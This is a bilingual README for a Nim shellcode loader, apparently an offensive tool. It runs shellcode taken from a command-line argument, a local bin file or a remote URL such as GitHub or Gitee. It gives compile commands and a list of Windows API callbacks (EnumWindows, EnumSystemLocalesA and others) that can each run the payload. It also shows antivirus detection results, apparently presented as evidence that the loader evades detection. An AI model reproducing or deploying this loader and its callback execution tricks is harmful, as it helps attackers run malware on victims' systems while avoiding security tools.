# nim_shellloader

详见以下:
details:
# usage
```
loader.exe payload.bin
loader.exe  (yourshellcode)
loader.exe (http://xxxx/xxx)
```
put your url/bin/shellcode direct
后面直接跟shellcode内容 或者bin文件名 或者网址就行


①use shellcode:

![](https://github.com/sh3d0ww01f/nim_shellloader/blob/master/image/1.gif)

②use bin file

使用bin文件加载shellcode

![](https://github.com/sh3d0ww01f/nim_shellloader/blob/master/image/2.gif)

③ load the shellcode which on your server(remote load)
加载你服务器上的shellcode

![](https://github.com/sh3d0ww01f/nim_shellloader/blob/master/image/3.gif)

Besides,You can load shellcode which on your reposiotory(gitee,github,etc.) like this

此外 你还可以把shellcode放在github，gitee的地方让loader去读

![](https://github.com/sh3d0ww01f/nim_shellloader/blob/master/image/4.png)

Notice:You must remove '\x' on your shellcode

注意:你必须去除你shellcode中的 \x

![](https://github.com/sh3d0ww01f/nim_shellloader/blob/master/image/5.png)


查杀情况


![](https://github.com/sh3d0ww01f/nim_shellloader/blob/master/image/6.png)

# 编译 compile

step1:   setup  require   安装所需的库
```
nimble install https://gitee.com/oagi/winim.git
nimble install https://gitee.com/oagi/nim-stew
```
step2: generate exe   生成exe
```
nim c --cpu:i386 -d:mingw -d:ssl --opt:size shellcode_loader.nim
```
# Advise 建议
windows上编译容易出现玄学问题 可以用debian11交叉编译 不过记得要装mingw


It's easy to have problem if you compile it on Windows Platform.In my opion,you'd better compile it on Linux


如果出现 :```could not load:(libcrypto-1_1|libeay32).dll```
If Go wrong with :```could not load:(libcrypto-1_1|libeay32).dll```

考虑是运行的平台问题 因为编译的时候i386是x86的   所以出现这个问题就把i386换成amd64

I consider this is because of the wrong command(it didn't match target's platform ),so please change "i386" to "amd64",like following

```
nim c --cpu:amd64 -d:mingw -d:ssl --opt:size shellcode_loader.nim
```

If it is compiled on windows, you don't need to add ```-d:mingw```

如果是windows上编译 则可以不用加```-d:mingw```


## 源码中的EnumSystemGeoID回调函数可以换成以下函数 等价
## The callback function named "EnumSystemGeoID" in my source can be replaced with following function
``` 
# Callback execution
    EnumSystemGeoID(GEOCLASS_NATION,0,cast[GEO_ENUMPROC](rPtr)) #①
    EnumChildWindows(cast[HWND](nil),cast[WNDENUMPROC](rPtr),cast[LPARAM](nil))#②
    EnumDateFormatsA(cast[DATEFMT_ENUMPROCA](rPtr) , LOCALE_SYSTEM_DEFAULT, cast[DWORD](0))#③
    EnumDesktopsW(GetProcessWindowStation(),cast[DESKTOPENUMPROCW](rPtr), cast[LPARAM](nil))#④
    EnumDesktopWindows(GetThreadDesktop(GetCurrentThreadId()),cast[WNDENUMPROC](rPtr), cast[LPARAM](nil))#⑤
    EnumSystemCodePagesA(cast[CODEPAGE_ENUMPROCA](rPtr) ,0)#⑥
    EnumSystemCodePagesW(cast[CODEPAGE_ENUMPROCW](rPtr), CP_INSTALLED)#⑦
    EnumSystemLanguageGroupsA(cast[LANGUAGEGROUP_ENUMPROCA](rPtr),LGRPID_SUPPORTED,0)#⑧
    EnumSystemLocalesA(cast[LOCALE_ENUMPROCA](rPtr) ,nil)#⑨
    EnumThreadWindows(0,csat[WNDENUMPROC](rPtr),0) #⑩
    EnumUILanguagesA(cast[UILANGUAGE_ENUMPROCA](rPtr), MUI_LANGUAGE_ID, 0)#11
    EnumWindows(cast[WNDENUMPROC](rPtr), cast[LPARAM](nil))#12
```
